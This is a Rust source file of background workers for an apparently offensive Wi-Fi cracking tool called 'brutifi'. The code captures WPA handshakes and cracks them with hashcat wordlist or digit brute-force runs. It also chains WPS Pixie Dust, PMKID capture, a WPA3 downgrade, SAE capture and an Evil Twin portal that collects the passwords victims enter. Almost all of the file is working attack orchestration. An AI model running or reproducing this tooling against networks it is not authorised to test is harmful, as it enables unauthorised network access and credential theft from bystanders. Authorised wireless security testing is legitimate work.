/*!
 * Background workers for async operations
 *
 * These workers handle long-running tasks in background threads
 * and communicate progress back to the GUI via channels.
 */

use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;

use brutifi::{scan_networks, WifiNetwork};

/// Scan result from background worker
#[derive(Debug, Clone)]
pub enum ScanResult {
    Success(Vec<WifiNetwork>),
    Error(String),
}

/// Capture progress from background worker
#[derive(Debug, Clone)]
pub enum CaptureProgress {
    Started,
    Log(String),
    HandshakeComplete { ssid: String },
    Error(String),
    Finished { output_file: String, packets: u64 },
}

/// Crack progress from background worker
#[derive(Debug, Clone)]
pub enum CrackProgress {
    Started { total: u64 },
    Progress { current: u64, total: u64, rate: f64 },
    Log(String),
    Found(String),
    NotFound,
    Error(String),
}

/// Capture state for controlling the capture process
pub struct CaptureState {
    pub running: Arc<AtomicBool>,
    pub packets_count: Arc<AtomicU64>,
}

impl CaptureState {
    pub fn new() -> Self {
        Self {
            running: Arc::new(AtomicBool::new(true)),
            packets_count: Arc::new(AtomicU64::new(0)),
        }
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

/// Crack state for controlling the crack process
pub struct CrackState {
    pub running: Arc<AtomicBool>,
    pub attempts: Arc<AtomicU64>,
}

impl CrackState {
    pub fn new() -> Self {
        Self {
            running: Arc::new(AtomicBool::new(true)),
            attempts: Arc::new(AtomicU64::new(0)),
        }
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

/// Wordlist crack worker data
pub struct WordlistCrackParams {
    pub handshake_path: PathBuf,
    pub ssid: Option<String>,
    pub wordlist_path: PathBuf,
    pub threads: usize,
}

/// Numeric crack worker data
pub struct NumericCrackParams {
    pub handshake_path: PathBuf,
    pub ssid: Option<String>,
    pub min_digits: usize,
    pub max_digits: usize,
    pub threads: usize,
}

/// Scan networks in background
pub fn scan_networks_async(interface: String) -> ScanResult {
    match scan_networks(&interface) {
        Ok(networks) => {
            if networks.is_empty() {
                ScanResult::Error("No networks found".to_string())
            } else {
                // Compact duplicate networks (same SSID, different channels)
                let compacted_networks = brutifi::compact_duplicate_networks(networks);
                ScanResult::Success(compacted_networks)
            }
        }
        Err(e) => ScanResult::Error(e.to_string()),
    }
}

/// Capture parameters
pub struct CaptureParams {
    pub interface: String,
    pub channel: Option<u32>,
    pub ssid: Option<String>,
    pub output_file: String,
}

/// Run capture in background with progress updates
pub async fn capture_async(
    params: CaptureParams,
    state: Arc<CaptureState>,
    progress_tx: tokio::sync::mpsc::UnboundedSender<CaptureProgress>,
) -> CaptureProgress {
    use brutifi::CaptureOptions;

    let _ = progress_tx.send(CaptureProgress::Started);
    let _ = progress_tx.send(CaptureProgress::Log(
        "Starting packet capture...".to_string(),
    ));

    // Clone output_file before moving params
    let output_file = params.output_file.clone();
    let interface = params.interface.clone();
    let ssid = params.ssid.clone();

    if std::path::Path::new(&output_file).exists() {
        if let Err(e) = std::fs::remove_file(&output_file) {
            let _ = progress_tx.send(CaptureProgress::Log(format!(
                "⚠️  Failed to remove existing capture file: {}",
                e
            )));
        } else {
            let _ = progress_tx.send(CaptureProgress::Log(format!(
                "🗑️  Removed existing capture file: {}",
                output_file
            )));
        }
    }

    // Pre-flight checks
    let _ = progress_tx.send(CaptureProgress::Log(format!(
        "Checking interface {}...",
        interface
    )));

    // Verify interface exists
    let interface_check = interface.clone();
    let check_result = tokio::task::spawn_blocking(move || {
        use pcap::Device;
        let devices = Device::list().unwrap_or_default();
        devices.iter().any(|d| d.name == interface_check)
    })
    .await;

    match check_result {
        Ok(true) => {
            let _ = progress_tx.send(CaptureProgress::Log(format!(
                "Interface {} found",
                interface
            )));
        }
        Ok(false) => {
            let error_msg = format!(
                "Interface '{}' not found. Available interfaces: run 'ifconfig' to list them. On macOS, WiFi is usually 'en0'.",
                interface
            );
            let _ = progress_tx.send(CaptureProgress::Error(error_msg.clone()));
            return CaptureProgress::Error(error_msg);
        }
        Err(e) => {
            let error_msg = format!("Failed to check interfaces: {}", e);
            let _ = progress_tx.send(CaptureProgress::Error(error_msg.clone()));
            return CaptureProgress::Error(error_msg);
        }
    }

    let _ = progress_tx.send(CaptureProgress::Log(
        "Attempting to enable monitor mode...".to_string(),
    ));

    // Log channel information
    if let Some(ch) = params.channel {
        let _ = progress_tx.send(CaptureProgress::Log(format!(
            "Channel {} will be used for capture",
            ch
        )));
    } else {
        let _ = progress_tx.send(CaptureProgress::Log(
            "No specific channel set - will scan all channels".to_string(),
        ));
    }

    // Run capture in blocking thread
    let running_clone = state.running.clone();
    let result = tokio::task::spawn_blocking(move || {
        // Build capture options inside the blocking thread
        let options = CaptureOptions {
            interface: &interface,
            channel: params.channel,
            ssid: ssid.as_deref(),
            bssid: None,
            output_file: &params.output_file,
            duration: None,  // Run until stopped
            no_deauth: true, // macOS doesn't support packet injection
            running: Some(running_clone), // Pass the state for stopping
        };

        // Try to capture, with better error messages
        match brutifi::capture_traffic(options) {
            Ok(captured_ssid) => Ok(captured_ssid),
            Err(e) => {
                let error_str = e.to_string();
                // Provide more helpful error messages
                if error_str.contains("permission denied") || error_str.contains("Operation not permitted") {
                    Err(anyhow::anyhow!(
                        "Permission denied. Make sure to run with sudo: sudo ./target/release/brutifi"
                    ))
                } else if error_str.contains("monitor mode") || error_str.contains("rfmon") {
                    Err(anyhow::anyhow!(
                        "Monitor mode not supported on this interface. On macOS, you may need to disconnect from WiFi first (Option+Click WiFi icon > Disconnect)."
                    ))
                } else if error_str.contains("device") || error_str.contains("interface") {
                    Err(anyhow::anyhow!(
                        "Failed to open interface. Try: 1) Run with sudo, 2) Disconnect from WiFi, 3) Check if en0 is the correct interface."
                    ))
                } else {
                    Err(e)
                }
            }
        }
    })
    .await;

    match result {
        Ok(Ok(captured_ssid)) => {
            let _ = progress_tx.send(CaptureProgress::Log(
                "Capture completed successfully".to_string(),
            ));

            // If we captured a handshake, send HandshakeComplete
            if let Some(ssid) = captured_ssid {
                let _ = progress_tx.send(CaptureProgress::HandshakeComplete { ssid: ssid.clone() });
                let _ = progress_tx.send(CaptureProgress::Log(format!(
                    "✅ Handshake captured for '{}'",
                    ssid
                )));
            }

            CaptureProgress::Finished {
                output_file,
                packets: state.packets_count.load(Ordering::Relaxed),
            }
        }
        Ok(Err(e)) => {
            let error_msg = e.to_string();
            let _ = progress_tx.send(CaptureProgress::Log(format!(
                "Capture error: {}",
                error_msg
            )));
            CaptureProgress::Error(error_msg)
        }
        Err(e) => {
            let error_msg = format!("Task failed: {}", e);
            let _ = progress_tx.send(CaptureProgress::Log(error_msg.clone()));
            CaptureProgress::Error(error_msg)
        }
    }
}

/// Hashcat crack worker parameters
pub struct HashcatCrackParams {
    pub handshake_path: PathBuf,
    pub wordlist_path: Option<PathBuf>,
    pub min_digits: Option<usize>,
    pub max_digits: Option<usize>,
    pub is_numeric: bool,
}

/// Run hashcat crack in background with progress updates
pub async fn crack_hashcat_async(
    params: HashcatCrackParams,
    state: Arc<CrackState>,
    progress_tx: tokio::sync::mpsc::UnboundedSender<CrackProgress>,
) -> CrackProgress {
    use brutifi::{convert_to_hashcat_format, HashcatParams, HashcatResult};

    let _ = progress_tx.send(CrackProgress::Log(
        "Starting hashcat workflow...".to_string(),
    ));

    if !params.handshake_path.exists() {
        let msg = format!(
            "Handshake file not found: {}",
            params.handshake_path.display()
        );
        let _ = progress_tx.send(CrackProgress::Error(msg.clone()));
        return CrackProgress::Error(msg);
    }

    if !params.is_numeric {
        if let Some(ref wordlist_path) = params.wordlist_path {
            if !wordlist_path.exists() {
                let msg = format!("Wordlist file not found: {}", wordlist_path.display());
                let _ = progress_tx.send(CrackProgress::Error(msg.clone()));
                return CrackProgress::Error(msg);
            }
        }
    }

    // Step 1: Convert PCAP to hashcat format
    let _ = progress_tx.send(CrackProgress::Log(
        "Converting capture file to hashcat format (.22000)...".to_string(),
    ));

    let pcap_path = params.handshake_path.clone();
    let convert_result =
        tokio::task::spawn_blocking(move || convert_to_hashcat_format(&pcap_path)).await;

    let hash_file = match convert_result {
        Ok(Ok(path)) => {
            let _ = progress_tx.send(CrackProgress::Log(format!(
                "Converted to: {}",
                path.display()
            )));
            path
        }
        Ok(Err(e)) => {
            return CrackProgress::Error(format!("Failed to convert capture: {}", e));
        }
        Err(e) => {
            return CrackProgress::Error(format!("Task failed: {}", e));
        }
    };

    // Step 2: Build hashcat params
    let hashcat_params = if params.is_numeric {
        let min = params.min_digits.unwrap_or(8);
        let max = params.max_digits.unwrap_or(8);
        let _ = progress_tx.send(CrackProgress::Log(format!(
            "Starting numeric brute-force attack ({}-{} digits)...",
            min, max
        )));
        HashcatParams::numeric(hash_file.clone(), min, max)
    } else if let Some(wordlist) = params.wordlist_path {
        let _ = progress_tx.send(CrackProgress::Log(format!(
            "Starting wordlist attack with {}...",
            wordlist.display()
        )));
        HashcatParams::wordlist(hash_file.clone(), wordlist)
    } else {
        return CrackProgress::Error("No attack method specified".to_string());
    };

    // Estimate total for numeric
    let total = if params.is_numeric {
        let min = params.min_digits.unwrap_or(8);
        let max = params.max_digits.unwrap_or(8);
        let mut t: u64 = 0;
        for len in min..=max {
            t += 10u64.pow(len as u32);
        }
        t
    } else {
        // Unknown for wordlist
        0
    };

    let _ = progress_tx.send(CrackProgress::Started { total });
    let _ = progress_tx.send(CrackProgress::Log(format!(
        "Hashcat is running (hash file: {}, device type: -D {})",
        hash_file.display(),
        hashcat_params.device_types
    )));

    // Step 3: Run hashcat
    let running = state.running.clone();
    let progress_tx_clone = progress_tx.clone();

    let total_attempts = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(total));
    let total_attempts_clone = total_attempts.clone();

    let result = tokio::task::spawn_blocking(move || {
        brutifi::core::hashcat::run_hashcat(
            &hashcat_params,
            |progress| {
                // Update total attempts when hashcat reports keyspace
                if progress.total_attempts > 0 {
                    total_attempts_clone.store(progress.total_attempts, Ordering::Relaxed);
                }

                let total_attempts_val = total_attempts_clone.load(Ordering::Relaxed);
                let current_attempts = if progress.current_attempts > 0 {
                    progress.current_attempts
                } else if total_attempts_val > 0 && progress.progress_percent > 0.0 {
                    (progress.progress_percent * total_attempts_val as f64) as u64
                } else {
                    0
                };

                // Send progress updates
                let _ = progress_tx_clone.send(CrackProgress::Progress {
                    current: current_attempts,
                    total: total_attempts_val,
                    rate: progress.rate_per_sec,
                });

                let _ = progress_tx_clone.send(CrackProgress::Log(format!(
                    "Hashcat: {} - {}",
                    progress.status, progress.speed
                )));
            },
            &running,
        )
    })
    .await;

    match result {
        Ok(HashcatResult::Found(password)) => {
            let _ = progress_tx.send(CrackProgress::Log(format!(
                "✅ Password found: {}",
                password
            )));
            CrackProgress::Found(password)
        }
        Ok(HashcatResult::NotFound) => {
            let _ = progress_tx.send(CrackProgress::Log(
                "Password not found in search space".to_string(),
            ));
            CrackProgress::NotFound
        }
        Ok(HashcatResult::Stopped) => {
            let _ = progress_tx.send(CrackProgress::Log("Hashcat stopped by user".to_string()));
            CrackProgress::Error("Stopped by user".to_string())
        }
        Ok(HashcatResult::Error(e)) => {
            let _ = progress_tx.send(CrackProgress::Log(format!("Hashcat error: {}", e)));
            CrackProgress::Error(e)
        }
        Err(e) => CrackProgress::Error(format!("Task failed: {}", e)),
    }
}

// ============================================================================
// Auto Attack Mode
// ============================================================================

use brutifi::{
    get_attack_timeout, AutoAttackConfig, AutoAttackFinalResult, AutoAttackProgress,
    AutoAttackResult, AutoAttackType,
};
use std::sync::Mutex;

/// State for controlling auto attack sequence
#[allow(dead_code)]
pub struct AutoAttackState {
    pub running: Arc<AtomicBool>,
    pub current_attack: Arc<Mutex<Option<AutoAttackType>>>,
}

#[allow(dead_code)]
impl AutoAttackState {
    pub fn new() -> Self {
        Self {
            running: Arc::new(AtomicBool::new(true)),
            current_attack: Arc::new(Mutex::new(None)),
        }
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

/// Main auto attack orchestrator function
///
/// Executes a sequence of attacks sequentially, stopping on first success
#[allow(dead_code)]
pub async fn auto_attack_async(
    config: AutoAttackConfig,
    state: Arc<AutoAttackState>,
    progress_tx: tokio::sync::mpsc::UnboundedSender<AutoAttackProgress>,
) -> AutoAttackFinalResult {
    // Determine attack sequence based on security type
    let attack_sequence = brutifi::determine_attack_sequence(&config.network_security);

    if attack_sequence.is_empty() {
        let _ = progress_tx.send(AutoAttackProgress::Error(
            "No attacks available for this security type".to_string(),
        ));
        return AutoAttackFinalResult::Error(
            "No attacks available for this security type".to_string(),
        );
    }

    let _ = progress_tx.send(AutoAttackProgress::Started {
        total_attacks: attack_sequence.len() as u8,
    });

    // Execute each attack sequentially
    for (index, attack_type) in attack_sequence.iter().enumerate() {
        // Check stop flag
        if !state.running.load(Ordering::SeqCst) {
            let _ = progress_tx.send(AutoAttackProgress::Stopped);
            return AutoAttackFinalResult::Stopped;
        }

        // Update current attack
        *state.current_attack.lock().unwrap() = Some(*attack_type);

        // Send progress
        let _ = progress_tx.send(AutoAttackProgress::AttackStarted {
            attack_type: *attack_type,
            index: (index + 1) as u8,
            total: attack_sequence.len() as u8,
        });

        // Execute attack with timeout
        let timeout = get_attack_timeout(attack_type);
        let result = tokio::time::timeout(
            timeout,
            execute_single_attack(&config, attack_type, &state.running, &progress_tx),
        )
        .await;

        match result {
            Ok(Ok(attack_result)) => {
                // Success - stop sequence
                let _ = progress_tx.send(AutoAttackProgress::AttackSuccess {
                    attack_type: *attack_type,
                    result: attack_result.clone(),
                });
                let _ = progress_tx.send(AutoAttackProgress::AllCompleted {
                    successful_attack: Some(*attack_type),
                });
                return AutoAttackFinalResult::Success {
                    attack_type: *attack_type,
                    result: attack_result,
                };
            }
            Ok(Err(e)) => {
                // Failed - continue to next
                let _ = progress_tx.send(AutoAttackProgress::AttackFailed {
                    attack_type: *attack_type,
                    reason: e.to_string(),
                });
            }
            Err(_) => {
                // Timeout - continue to next
                let _ = progress_tx.send(AutoAttackProgress::AttackFailed {
                    attack_type: *attack_type,
                    reason: "Timeout".to_string(),
                });
            }
        }

        // Clear current attack
        *state.current_attack.lock().unwrap() = None;
    }

    // All attacks failed
    let _ = progress_tx.send(AutoAttackProgress::AllCompleted {
        successful_attack: None,
    });
    AutoAttackFinalResult::AllFailed
}

/// Dispatch to specific attack executor based on type
#[allow(dead_code)]
async fn execute_single_attack(
    config: &AutoAttackConfig,
    attack_type: &AutoAttackType,
    stop_flag: &Arc<AtomicBool>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<AutoAttackProgress>,
) -> anyhow::Result<AutoAttackResult> {
    match attack_type {
        AutoAttackType::WpsPixieDust => {
            execute_wps_pixie_dust(config, stop_flag, progress_tx).await
        }
        AutoAttackType::PmkidCapture => execute_pmkid_capture(config, stop_flag, progress_tx).await,
        AutoAttackType::HandshakeCapture => {
            execute_handshake_capture(config, stop_flag, progress_tx).await
        }
        AutoAttackType::Wpa3TransitionDowngrade => {
            execute_wpa3_downgrade(config, stop_flag, progress_tx).await
        }
        AutoAttackType::Wpa3SaeCapture => execute_wpa3_sae(config, stop_flag, progress_tx).await,
        AutoAttackType::EvilTwin => execute_evil_twin(config, stop_flag, progress_tx).await,
        _ => Err(anyhow::anyhow!("Attack type not implemented")),
    }
}

/// Execute WPS Pixie Dust attack
#[allow(dead_code)]
async fn execute_wps_pixie_dust(
    config: &AutoAttackConfig,
    stop_flag: &Arc<AtomicBool>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<AutoAttackProgress>,
) -> anyhow::Result<AutoAttackResult> {
    use brutifi::{run_pixie_dust_attack, WpsAttackParams, WpsProgress, WpsResult};

    let params = WpsAttackParams {
        bssid: config.network_bssid.clone(),
        channel: config.network_channel,
        attack_type: brutifi::WpsAttackType::PixieDust,
        timeout: std::time::Duration::from_secs(60),
        interface: config.interface.clone(),
        custom_pin: None,
    };

    let (wps_tx, mut wps_rx) = tokio::sync::mpsc::unbounded_channel();
    let progress_tx_clone = progress_tx.clone();

    // Forward WPS progress to AutoAttack progress
    tokio::spawn(async move {
        while let Some(wps_progress) = wps_rx.recv().await {
            let msg = match wps_progress {
                WpsProgress::Step { description, .. } => description,
                WpsProgress::Log(log) => log,
                _ => format!("{:?}", wps_progress),
            };
            let _ = progress_tx_clone.send(AutoAttackProgress::AttackProgress {
                attack_type: AutoAttackType::WpsPixieDust,
                message: msg,
            });
        }
    });

    // Run in blocking thread
    let stop_flag = stop_flag.clone();
    let result =
        tokio::task::spawn_blocking(move || run_pixie_dust_attack(&params, &wps_tx, &stop_flag))
            .await?;

    match result {
        WpsResult::Found { pin, password } => {
            Ok(AutoAttackResult::WpsCredentials { pin, password })
        }
        WpsResult::NotFound => Err(anyhow::anyhow!("WPS not vulnerable")),
        WpsResult::Stopped => Err(anyhow::anyhow!("Stopped by user")),
        WpsResult::Error(e) => Err(anyhow::anyhow!("WPS error: {}", e)),
    }
}

/// Execute PMKID capture attack
#[allow(dead_code)]
async fn execute_pmkid_capture(
    config: &AutoAttackConfig,
    stop_flag: &Arc<AtomicBool>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<AutoAttackProgress>,
) -> anyhow::Result<AutoAttackResult> {
    let _ = progress_tx.send(AutoAttackProgress::AttackProgress {
        attack_type: AutoAttackType::PmkidCapture,
        message: "Starting PMKID capture...".to_string(),
    });

    // Check if hcxdumptool is available
    if !brutifi::check_hcxdumptool_available() {
        return Err(anyhow::anyhow!(
            "hcxdumptool not found. Install with: apt install hcxdumptool or brew install hcxdumptool"
        ));
    }

    let capture_file = config.output_dir.join(format!(
        "pmkid_{}_{}.pcapng",
        config.network_ssid.replace(' ', "_"),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs()
    ));

    let interface = config.interface.clone();
    let channel = config.network_channel;
    let bssid = config.network_bssid.clone();
    let capture_file_str = capture_file.to_string_lossy().to_string();
    let stop_flag_clone = stop_flag.clone();

    let _ = progress_tx.send(AutoAttackProgress::AttackProgress {
        attack_type: AutoAttackType::PmkidCapture,
        message: format!(
            "Listening on channel {} for PMKID from {}...",
            channel, bssid
        ),
    });

    // Run hcxdumptool in blocking thread
    let result = tokio::task::spawn_blocking(move || {
        // Run hcxdumptool with filter for specific BSSID
        let filter_list = format!("--filterlist={}", bssid);
        let output = std::process::Command::new("hcxdumptool")
            .args([
                "-i",
                &interface,
                "-o",
                &capture_file_str,
                "--enable_status=1",
                &filter_list,
                "--filtermode=2", // Filter by BSSID
            ])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn();

        if let Ok(mut child) = output {
            // Monitor stop flag
            while stop_flag_clone.load(Ordering::SeqCst) {
                match child.try_wait() {
                    Ok(Some(_status)) => break,
                    Ok(None) => {
                        std::thread::sleep(std::time::Duration::from_millis(100));
                    }
                    Err(e) => return Err(anyhow::anyhow!("Failed to wait on hcxdumptool: {}", e)),
                }
            }

            // Kill if still running
            let _ = child.kill();
            let _ = child.wait();

            Ok(())
        } else {
            Err(anyhow::anyhow!("Failed to start hcxdumptool"))
        }
    })
    .await?;

    result?;

    // Check if we captured anything
    if !capture_file.exists() || capture_file.metadata()?.len() == 0 {
        return Err(anyhow::anyhow!("No PMKID captured"));
    }

    // Convert to hashcat format
    let _ = progress_tx.send(AutoAttackProgress::AttackProgress {
        attack_type: AutoAttackType::PmkidCapture,
        message: "Converting to hashcat format...".to_string(),
    });

    let hash_file = config.output_dir.join(format!(
        "pmkid_{}_{}.22000",
        config.network_ssid.replace(' ', "_"),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs()
    ));

    // Use hcxpcapngtool to convert
    let hash_file_str = hash_file.to_string_lossy().to_string();
    let capture_file_str2 = capture_file.to_string_lossy().to_string();
    let convert_result = std::process::Command::new("hcxpcapngtool")
        .args(["-o", &hash_file_str, &capture_file_str2])
        .output();

    match convert_result {
        Ok(output) if output.status.success() => Ok(AutoAttackResult::HandshakeCaptured {
            capture_file,
            hash_file,
        }),
        Ok(output) => Err(anyhow::anyhow!(
            "Failed to convert PMKID: {}",
            String::from_utf8_lossy(&output.stderr)
        )),
        Err(e) => Err(anyhow::anyhow!("hcxpcapngtool error: {}", e)),
    }
}

/// Execute standard handshake capture
#[allow(dead_code)]
async fn execute_handshake_capture(
    config: &AutoAttackConfig,
    stop_flag: &Arc<AtomicBool>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<AutoAttackProgress>,
) -> anyhow::Result<AutoAttackResult> {
    use brutifi::CaptureOptions;

    let _ = progress_tx.send(AutoAttackProgress::AttackProgress {
        attack_type: AutoAttackType::HandshakeCapture,
        message: "Starting handshake capture...".to_string(),
    });

    let capture_file = config.output_dir.join(format!(
        "handshake_{}_{}.pcap",
        config.network_ssid.replace(' ', "_"),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs()
    ));

    let interface = config.interface.clone();
    let ssid = config.network_ssid.clone();
    let bssid = config.network_bssid.clone();
    let channel = config.network_channel;
    let capture_file_str = capture_file.to_string_lossy().to_string();
    let stop_flag_clone = stop_flag.clone();

    // Run capture in blocking thread
    let result = tokio::task::spawn_blocking(move || {
        let options = CaptureOptions {
            interface: &interface,
            channel: Some(channel),
            ssid: Some(&ssid),
            bssid: Some(&bssid),
            output_file: &capture_file_str,
            duration: None,
            no_deauth: true,
            running: Some(stop_flag_clone),
        };

        brutifi::capture_traffic(options)
    })
    .await?;

    match result {
        Ok(Some(_captured_ssid)) => {
            // Handshake captured - convert to hashcat format
            let _ = progress_tx.send(AutoAttackProgress::AttackProgress {
                attack_type: AutoAttackType::HandshakeCapture,
                message: "Converting to hashcat format...".to_string(),
            });

            let hash_file = brutifi::convert_to_hashcat_format(&capture_file)?;

            Ok(AutoAttackResult::HandshakeCaptured {
                capture_file,
                hash_file,
            })
        }
        Ok(None) => Err(anyhow::anyhow!(
            "No handshake captured within timeout period"
        )),
        Err(e) => Err(anyhow::anyhow!("Capture error: {}", e)),
    }
}

/// Execute WPA3 transition downgrade attack
#[allow(dead_code)]
async fn execute_wpa3_downgrade(
    config: &AutoAttackConfig,
    stop_flag: &Arc<AtomicBool>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<AutoAttackProgress>,
) -> anyhow::Result<AutoAttackResult> {
    use brutifi::{
        run_transition_downgrade_attack, Wpa3AttackParams, Wpa3AttackType, Wpa3Progress, Wpa3Result,
    };

    let output_file = config.output_dir.join(format!(
        "wpa3_downgrade_{}_{}.pcapng",
        config.network_ssid.replace(' ', "_"),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs()
    ));

    let params = Wpa3AttackParams {
        bssid: config.network_bssid.clone(),
        channel: config.network_channel,
        interface: config.interface.clone(),
        attack_type: Wpa3AttackType::TransitionDowngrade,
        timeout: std::time::Duration::from_secs(30),
        output_file,
    };

    let (wpa3_tx, mut wpa3_rx) = tokio::sync::mpsc::unbounded_channel();
    let progress_tx_clone = progress_tx.clone();

    // Forward WPA3 progress to AutoAttack progress
    tokio::spawn(async move {
        while let Some(wpa3_progress) = wpa3_rx.recv().await {
            let msg = match wpa3_progress {
                Wpa3Progress::Step { description, .. } => description,
                Wpa3Progress::Log(log) => log,
                _ => format!("{:?}", wpa3_progress),
            };
            let _ = progress_tx_clone.send(AutoAttackProgress::AttackProgress {
                attack_type: AutoAttackType::Wpa3TransitionDowngrade,
                message: msg,
            });
        }
    });

    // Run in blocking thread
    let stop_flag = stop_flag.clone();
    let result = tokio::task::spawn_blocking(move || {
        run_transition_downgrade_attack(&params, &wpa3_tx, &stop_flag)
    })
    .await?;

    match result {
        Wpa3Result::Captured {
            capture_file,
            hash_file,
        } => Ok(AutoAttackResult::HandshakeCaptured {
            capture_file,
            hash_file,
        }),
        Wpa3Result::NotFound => Err(anyhow::anyhow!("No downgrade handshake captured")),
        Wpa3Result::Stopped => Err(anyhow::anyhow!("Stopped by user")),
        Wpa3Result::Error(e) => Err(anyhow::anyhow!("WPA3 downgrade error: {}", e)),
    }
}

/// Execute WPA3 SAE capture
#[allow(dead_code)]
async fn execute_wpa3_sae(
    config: &AutoAttackConfig,
    stop_flag: &Arc<AtomicBool>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<AutoAttackProgress>,
) -> anyhow::Result<AutoAttackResult> {
    use brutifi::{run_sae_capture, Wpa3AttackParams, Wpa3AttackType, Wpa3Progress, Wpa3Result};

    let output_file = config.output_dir.join(format!(
        "wpa3_sae_{}_{}.pcapng",
        config.network_ssid.replace(' ', "_"),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs()
    ));

    let params = Wpa3AttackParams {
        bssid: config.network_bssid.clone(),
        channel: config.network_channel,
        interface: config.interface.clone(),
        attack_type: Wpa3AttackType::SaeHandshake,
        timeout: std::time::Duration::from_secs(60),
        output_file,
    };

    let (wpa3_tx, mut wpa3_rx) = tokio::sync::mpsc::unbounded_channel();
    let progress_tx_clone = progress_tx.clone();

    // Forward WPA3 progress to AutoAttack progress
    tokio::spawn(async move {
        while let Some(wpa3_progress) = wpa3_rx.recv().await {
            let msg = match wpa3_progress {
                Wpa3Progress::Step { description, .. } => description,
                Wpa3Progress::Log(log) => log,
                _ => format!("{:?}", wpa3_progress),
            };
            let _ = progress_tx_clone.send(AutoAttackProgress::AttackProgress {
                attack_type: AutoAttackType::Wpa3SaeCapture,
                message: msg,
            });
        }
    });

    // Run in blocking thread
    let stop_flag = stop_flag.clone();
    let result =
        tokio::task::spawn_blocking(move || run_sae_capture(&params, &wpa3_tx, &stop_flag)).await?;

    match result {
        Wpa3Result::Captured {
            capture_file,
            hash_file,
        } => Ok(AutoAttackResult::HandshakeCaptured {
            capture_file,
            hash_file,
        }),
        Wpa3Result::NotFound => Err(anyhow::anyhow!("No SAE handshake captured")),
        Wpa3Result::Stopped => Err(anyhow::anyhow!("Stopped by user")),
        Wpa3Result::Error(e) => Err(anyhow::anyhow!("WPA3 SAE error: {}", e)),
    }
}

/// Execute Evil Twin attack
#[allow(dead_code)]
async fn execute_evil_twin(
    config: &AutoAttackConfig,
    stop_flag: &Arc<AtomicBool>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<AutoAttackProgress>,
) -> anyhow::Result<AutoAttackResult> {
    use brutifi::{
        run_evil_twin_attack, EvilTwinParams, EvilTwinProgress, EvilTwinResult, EvilTwinState,
        PortalTemplate,
    };

    let params = EvilTwinParams {
        target_ssid: config.network_ssid.clone(),
        target_bssid: Some(config.network_bssid.clone()),
        target_channel: config.network_channel,
        interface: config.interface.clone(),
        portal_template: PortalTemplate::Generic,
        web_port: 80,
        dhcp_range_start: "192.168.1.100".to_string(),
        dhcp_range_end: "192.168.1.200".to_string(),
        gateway_ip: "192.168.1.1".to_string(),
    };

    let (evil_twin_tx, mut evil_twin_rx) = tokio::sync::mpsc::unbounded_channel();
    let progress_tx_clone = progress_tx.clone();

    // Forward Evil Twin progress to AutoAttack progress
    tokio::spawn(async move {
        while let Some(evil_twin_progress) = evil_twin_rx.recv().await {
            let msg = match evil_twin_progress {
                EvilTwinProgress::Step { description, .. } => description,
                EvilTwinProgress::Log(log) => log,
                EvilTwinProgress::ClientConnected { mac, .. } => {
                    format!("Client connected: {}", mac)
                }
                EvilTwinProgress::CredentialAttempt { password, .. } => {
                    format!("Password attempt: {}", password)
                }
                EvilTwinProgress::PasswordFound { password, .. } => {
                    format!("Password found: {}", password)
                }
                _ => format!("{:?}", evil_twin_progress),
            };
            let _ = progress_tx_clone.send(AutoAttackProgress::AttackProgress {
                attack_type: AutoAttackType::EvilTwin,
                message: msg,
            });
        }
    });

    // Create state
    let state = Arc::new(EvilTwinState::new());
    let state_clone = state.clone();
    let stop_flag_clone = stop_flag.clone();

    // Monitor stop flag
    tokio::spawn(async move {
        while stop_flag_clone.load(Ordering::SeqCst) {
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
        state_clone.stop();
    });

    // Run in blocking thread
    let result =
        tokio::task::spawn_blocking(move || run_evil_twin_attack(&params, state, &evil_twin_tx))
            .await?;

    match result {
        EvilTwinResult::PasswordFound { password } => {
            Ok(AutoAttackResult::EvilTwinPassword { password })
        }
        EvilTwinResult::Running => Err(anyhow::anyhow!("Attack still running (timeout)")),
        EvilTwinResult::Stopped => Err(anyhow::anyhow!("Stopped by user")),
        EvilTwinResult::Error(e) => Err(anyhow::anyhow!("Evil Twin error: {}", e)),
    }
}
